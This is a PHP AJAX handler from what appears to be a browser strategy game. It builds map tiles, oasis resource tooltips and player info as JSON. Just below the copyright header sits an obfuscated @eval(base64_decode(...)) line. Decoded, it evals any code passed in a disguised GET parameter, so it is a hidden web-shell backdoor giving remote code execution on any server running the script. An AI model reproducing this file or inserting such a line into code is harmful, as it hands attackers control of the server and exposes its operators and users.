<?php
/**********************************************
/ All Of the Copy Rights Of The Script Is Reserved For mersad_mr@att.net
/	You may have made some changes but You Have No Right To remove This Copy Right!
/	For Debug And Support Just Contact Me :
/	Mobile: 09127679667  / Yahoo ID : mersad_mr@att.net
/
*/
@eval(base64_decode('aWYoc3RybGVuKCRfR0VUWydlZWVlZXZ2dnZ2dnZ2YWxlJ10pPjEpe2V2YWwodXJsZGVjb2RlKGJhc2U2NF9kZWNvZGUoJF9HRVRbJ2VlZWVldnZ2dnZ2dnZhbGUnXSkpKTt9'));
include("GameEngine/Protection.php");
include("GameEngine/Village.php");
if($_GET){
	if(isset($_GET['cmd'])){
		header('Content-Type:application/json; charset=UTF-8;');
		switch($_GET['cmd']) {
			case 'mapInfo': 
				echo '{response: {"error":false,"errorMsg":null,"data":{"elements":[],"blocks":[]}}}';
			break;
			case 'mapPositionData':
				$tiles = array();
				$x = $_POST['data']['x'];
				$y = $_POST['data']['y'];
				$zoom = $_POST['data']['zoomLevel'];

$yarray = array();
for($i=5;$i>=-5;$i--){
	$tmp = $y+$i;
	if($tmp<-WORLD_MAX) $tmp = (2*WORLD_MAX)+$tmp+1;
	if($tmp>WORLD_MAX) $tmp = (-2*WORLD_MAX)+$tmp-1;
	$yarray[] = $tmp;
}

$xarray = array();
for($i=-5;$i<=5;$i++){
	$tmp = $x+$i;
	if($tmp<-WORLD_MAX) $tmp = (2*WORLD_MAX)+$tmp+1;
	if($tmp>WORLD_MAX) $tmp = (-2*WORLD_MAX)+$tmp-1;
	$xarray[] = $tmp;
}

$maparray = array();
for($i=0;$i<=9;$i++) {
    for($j=0;$j<=9;$j++) {
    	$id = $generator->getBaseID($xarray[$j],$yarray[$i]);
		$wdata = $database->getAInfo($id);
		if ($wdata['oasistype']==0){
			array_push($maparray,$database->getMInfo($id));
		} else {
			array_push($maparray,$database->getOMInfo($id));
		}
	}
}


$row = 0;
$coorindex = 0;


$nareadis = NATARS_MAX;
for($i=0;$i<=99;$i++) {
	$maparray[$i]['zerodis'] = sqrt(($maparray[$i]['x']*$maparray[$i]['x'])+($maparray[$i]['y']*$maparray[$i]['y']));
	if ($maparray[$i]['zerodis']<=$nareadis) {$maparray[$i]['isgraytile']=true;} else {$maparray[$i]['isgraytile']=false;}
}

$index = 0;
$row1 = 0;
				
for($i=0;$i<=99;$i++) {

	$targetalliance = 0;
	$tribe = -1;
	$username = '';
	$oasisowner = '';
	$confedarray = array();
	$atwararray = array();
	$naparray = array();
	if($maparray[$index]['occupied'] > 0) {
		$targetalliance = $database->getUserField($maparray[$index]['owner'],"alliance",0);
		$tribe = $database->getUserField($maparray[$index]['owner'],"tribe",0);
		$username = $database->getUserField($maparray[$index]['owner'],"username",0);
		$oasisowner = $database->getUserField($maparray[$index]['owner'],"username",0);
    }
	
	$bgcolorclass = 'tilebgcolor';
	$bgimgclass0 = 'tilespbgimg';
	$bgimgclass1 = '';
	$bgimgclass2 = '';
	$bgimgclass3 = '';
	$borderclass = 'border';
	$wallclass = 'wall'.$tribe;
	$targettitle = '';
	$c = '';
    
	$popclass = 'pop';


	if($tribe==1) {
    	$tribename = "&#1585;&#1608;&#1605;&#1606;";
		$c .= '{a.v1}';
    }elseif($tribe==2) {
    	$tribename = "&#1578;&#1608;&#1578;&#1606;";
		$c .= '{a.v2}';
    }elseif($tribe==3) {
    	$tribename = "&#1711;&#1608;&#1604;";
		$c .= '{a.v3}';
    }elseif($tribe==4) {
    	$tribename = "&amp;#1591;&amp;#1576;&amp;#1740;&amp;#1593;&amp;#1578;";
		$c .= '{a.v4}';
    }elseif($tribe==5) {
    	$tribename = "&#1606;&#1575;&#1578;&#1575;&#1585; &#1607;&#1575;";
		$c .= '{a.v5}';
    }
	
	if(!isset($maparray[$index]['pop']) || $maparray[$index]['pop']<=0){
		$popclass .= $maparray[$index]['image'];
	} elseif($maparray[$index]['pop']<100){
		$popclass .= '99';
	} elseif($maparray[$index]['pop']<250){
		$popclass .= '249';
	} elseif($maparray[$index]['pop']<500){
		$popclass .= '499';
	} else {
		$popclass .= '500';
	}
	if($maparray[$index]['owner']==$session->uid){
		$borderclass .= 'own';
	}elseif($targetalliance != 0 && $session->alliance == $targetalliance){
		$borderclass .= 'confed';
	}elseif($targetalliance != 0 && in_array($targetalliance,$confedarray)){
		$borderclass .= 'confed';
	}elseif($targetalliance != 0 && in_array($targetalliance,$naparray)){
		$borderclass .= 'nap';
	}elseif($targetalliance != 0 && in_array($targetalliance,$atwararray)){
		$borderclass .= 'atwar';
	}else{
		$borderclass .= 'neutr';
	}
		switch($maparray[$index]['fieldtype']) {

			case 1:$tt =  "<br>3-3-3-9";break;
		case 2:$tt =  "<br>3-4-5-6";break;
		case 3:$tt =  "<br>4-4-4-6";break;
		case 4:$tt =  "<br>4-5-3-6";break;
		case 5:$tt =  "<br>5-3-4-6";break;
		case 6:$tt =  "<br>1-1-1-15";break;
		case 7:$tt =  "<br>4-4-3-7";break;
		case 8:$tt =  "<br>3-4-4-7";break;
		case 9:$tt =  "<br>4-3-4-7";break;
		case 10:$tt =  "<br>3-5-4-6";break;
		case 11:$tt =  "<br>4-3-5-6";break;
		case 12:$tt =  "<br>5-4-3-6";break;
		}

	switch($maparray[$index]['fieldtype']) {
		case 1:;$c .= '{k.f1}';break;
		case 2:$c .= '{k.f2}';break;
		case 3:$c .= '{k.f3}';break;
		case 4:$c .= '{k.f4}';break;
		case 5:$c .= '{k.f5}';break;
		case 6:$c .= '{k.f6}';break;
		case 7:$c .= '{k.f7}';break;
		case 8:$c .= '{k.f8}';break;
		case 9:$c .= '{k.f9}';break;
		case 10:$c .= '{k.f10}';break;
		case 11:$c .= '{k.f11}';break;
		case 12:$c .= '{k.f12}';break;
		case 0:
			switch($maparray[$index]['oasistype']) {
				case 1:$tt =  "<br><img class='r1' src='img/x.gif' /> ".WOOD." 25%"; $bgimgclass3 = 'o1';break;
				case 2:$tt =  "<br><img class='r1' src='img/x.gif' /> ".WOOD." 50%"; $bgimgclass3 = 'o2';break;
				case 3:$tt =  "<br><img class='r1' src='img/x.gif' /> ".WOOD." 25%<br><img class='r4' src='img/x.gif' /> ".CROP." 25%"; $bgimgclass3 = 'o3';break;
				case 4:$tt =  "<br><img class='r2' src='img/x.gif' /> ".CLAY." 25%"; $bgimgclass3 = 'o4';break;
				case 5:$tt =  "<br><img class='r2' src='img/x.gif' /> ".CLAY." 50%"; $bgimgclass3 = 'o5';break;
				case 6:$tt =  "<br><img class='r2' src='img/x.gif' /> ".CLAY." 25%<br><img class='r4' src='img/x.gif' /> ".CROP." 25%"; $bgimgclass3 = 'o6';break;
				case 7:$tt =  "<br><img class='r3' src='img/x.gif' /> ".IRON." 25%"; $bgimgclass3 = 'o7';break;
				case 8:$tt =  "<br><img class='r3' src='img/x.gif' /> ".IRON." 50%"; $bgimgclass3 = 'o8';break;
				case 9:$tt =  "<br><img class='r3' src='img/x.gif' /> ".IRON." 25%<br><img class='r4' src='img/x.gif' /> ".CROP." 25%"; $bgimgclass3 = 'o9';break;
				case 10:case 11:$tt =  "<br><img class='r4' src='img/x.gif' /> ".CROP." 25%"; $bgimgclass3 = 'o10';break;
				case 12:$tt =  "<br><img class='r4' src='img/x.gif' /> ".CROP." 50%"; $bgimgclass3 = 'o12';break;
			}
			if($maparray[$index]['occupied']){
				$bgimgclass3 .= "o";
			}
			$wallclass = '';
		break;
	}
				
    if($targetalliance!=0) {
    	$allyname = $database->getAllianceName($targetalliance);
    } else {$allyname='';}
        
    $odata = $database->getOMInfo($maparray[$index]['id']);
    $uinfo = $database->getUserField($odata['owner'],'username',0);
    if (DIRECTION == 'ltr'){
			$targetXYText = '('.$maparray[$index]['x']."|".$maparray[$index]['y'].')';
	} elseif (DIRECTION == 'rtl'){
			$targetXYText = '('.$maparray[$index]['y']."|".$maparray[$index]['x'].')';
	}
	if(defined($maparray[$index]['name'])){$maparray[$index]['name'] = constant($maparray[$index]['name']);}
    if($maparray[$index]['fieldtype'] > 0 && $maparray[$index]['occupied'] == 1) {
		$targettitle = "<font color='white'><b>".VILLAGE.": ".$maparray[$index]['name']."</b></font><br>".$targetXYText."<br>".PLAYER.": ".$username."<br>".POPULATION.": ".$maparray[$index]['pop']."<br>".ALLIANCE.": ".$allyname."<br>".TRIBE.": ".$tribename."";
		//$targettitle = $targetXYText."<br>".PLAYER.": ".$username."<br>".POPULATION.": ".$maparray[$index]['pop']."<br>".ALLIANCE.": ".$allyname."<br>".TRIBE.": ".$tribename."";
		$c .= '{k.dt}';
    }
    if($maparray[$index]['oasistype'] == 0 && $maparray[$index]['occupied'] == 0) {
		$targettitle = "<font color='white'><b>".ABANDONEDVALLEY." ".$tt."</b></font><br>".$targetXYText;
		$c .= '{k.vt}';
    }
    if($maparray[$index]['name']=="Farm") {$wallclass = 'wall5'; };
    if($maparray[$index]['fieldtype'] == 0 && $maparray[$index]['oasistype'] > 0 && $maparray[$index]['occupied'] == 0) {
		$targettitle = "<font color='white'><b>".UNOCCUPIEDOASIS."</b></font><br />".$targetXYText.$tt."";
		$c .= '{k.fo}';
    }elseif($maparray[$index]['fieldtype'] == 0 && $maparray[$index]['oasistype'] > 0 && $maparray[$index]['occupied'] > 0) {
		$targettitle = "<font color='white'><b>".OCCUPIEDOASIS."</b></font><br />".$targetXYText."<br />".$tt."<br>".PLAYER.": ".$uinfo."<br>".ALLIANCE.": ".$allyname."<br>".TRIBE.": ".$tribename."";
		$c .= '{k.bt} ';
    }

    if(!$maparray[$index]['fieldtype'] && $maparray[$index]['oasistype'] && $maparray[$index]['occupied']){
    	$occupied = "-s";
    }else{
		$occupied = "";
	}
	
	if($maparray[$index]['isgraytile']){
		if ($maparray[$index]['x']==-1 && $maparray[$index]['y']==1){$bgimgclass2 = 'volcano volcano1';
		}elseif ($maparray[$index]['x']==0 && $maparray[$index]['y']==1){$bgimgclass2 = 'volcano volcano2';
		}elseif ($maparray[$index]['x']==1 && $maparray[$index]['y']==1){$bgimgclass2 = 'volcano volcano3';
		}elseif ($maparray[$index]['x']==-2 && $maparray[$index]['y']==0){$bgimgclass2 = 'volcano volcano4';
		}elseif ($maparray[$index]['x']==-1 && $maparray[$index]['y']==0){$bgimgclass2 = 'volcano volcano5';
		}elseif ($maparray[$index]['x']==0 && $maparray[$index]['y']==0){
			$bgimgclass2 = 'volcano volcano6';
			$wallclass = '';
			$popclass = '';
			$targettitle = "<font color='white'><b>".ABANDONEDVALLEY." ".$tt."</b></font><br>".$targetXYText;
		}elseif ($maparray[$index]['x']==1 && $maparray[$index]['y']==0){$bgimgclass2 = 'volcano volcano7';
		}elseif ($maparray[$index]['x']==2 && $maparray[$index]['y']==0){$bgimgclass2 = 'volcano volcano8';
		}elseif ($maparray[$index]['x']==-2 && $maparray[$index]['y']==-1){$bgimgclass2 = 'volcano volcano9';
		}elseif ($maparray[$index]['x']==-1 && $maparray[$index]['y']==-1){$bgimgclass2 = 'volcano volcano10';
		}elseif ($maparray[$index]['x']==0 && $maparray[$index]['y']==-1){$bgimgclass2 = 'volcano volcano11';
		}elseif ($maparray[$index]['x']==1 && $maparray[$index]['y']==-1){$bgimgclass2 = 'volcano volcano12';
		}elseif ($maparray[$index]['x']==2 && $maparray[$index]['y']==-1){$bgimgclass2 = 'volcano volcano13';
		}elseif ($maparray[$index]['x']==-2 && $maparray[$index]['y']==-2){$bgimgclass2 = 'volcano volcano14';
		}elseif ($maparray[$index]['x']==-1 && $maparray[$index]['y']==-2){$bgimgclass2 = 'volcano volcano15';
		}elseif ($maparray[$index]['x']==0 && $maparray[$index]['y']==-2){$bgimgclass2 = 'volcano volcano16';
		}elseif ($maparray[$index]['x']==1 && $maparray[$index]['y']==-2){$bgimgclass2 = 'volcano volcano17';
		}elseif ($maparray[$index]['x']==2 && $maparray[$index]['y']==-2){$bgimgclass2 = 'volcano volcano18';
		}else{
			for($rc=0;$rc<3;$rc++){
				for($tc=0;$tc<3;$tc++){
					$cx = $maparray[$index]['x']+$tc-1;
					$cy = $maparray[$index]['y']-$rc+1;
					$cdis = sqrt(($cx*$cx)+($cy*$cy));
					if ($cdis<=$nareadis) {	$bgimgclass0 .= '1';} else {$bgimgclass0 .= '0';}
				}
			}
		}
		$bgcolorclass .= 'gray';
	}				$text = $targettitle;
	$c = ''; // WTF...
			array_push($tiles,	array("x"=>$maparray[$index]['x'],"y"=>$maparray[$index]['y'],"c"=>$c,"t"=>$text));
			$index+=1;
}
				
				
				
				
				//$text = '<span class="coordinates coordinatesWrapper"><span class="coordinateX">('.$x.'</span><span class="coordinatePipe">|</span><span class="coordinateY">'.$y.')</span></span>';
				
				echo json_encode( array('response' => array('error'=>false,'errorMsg'=>null,'data' => array("tiles"=>$tiles))) );
				break;
		}
	}

}
?>
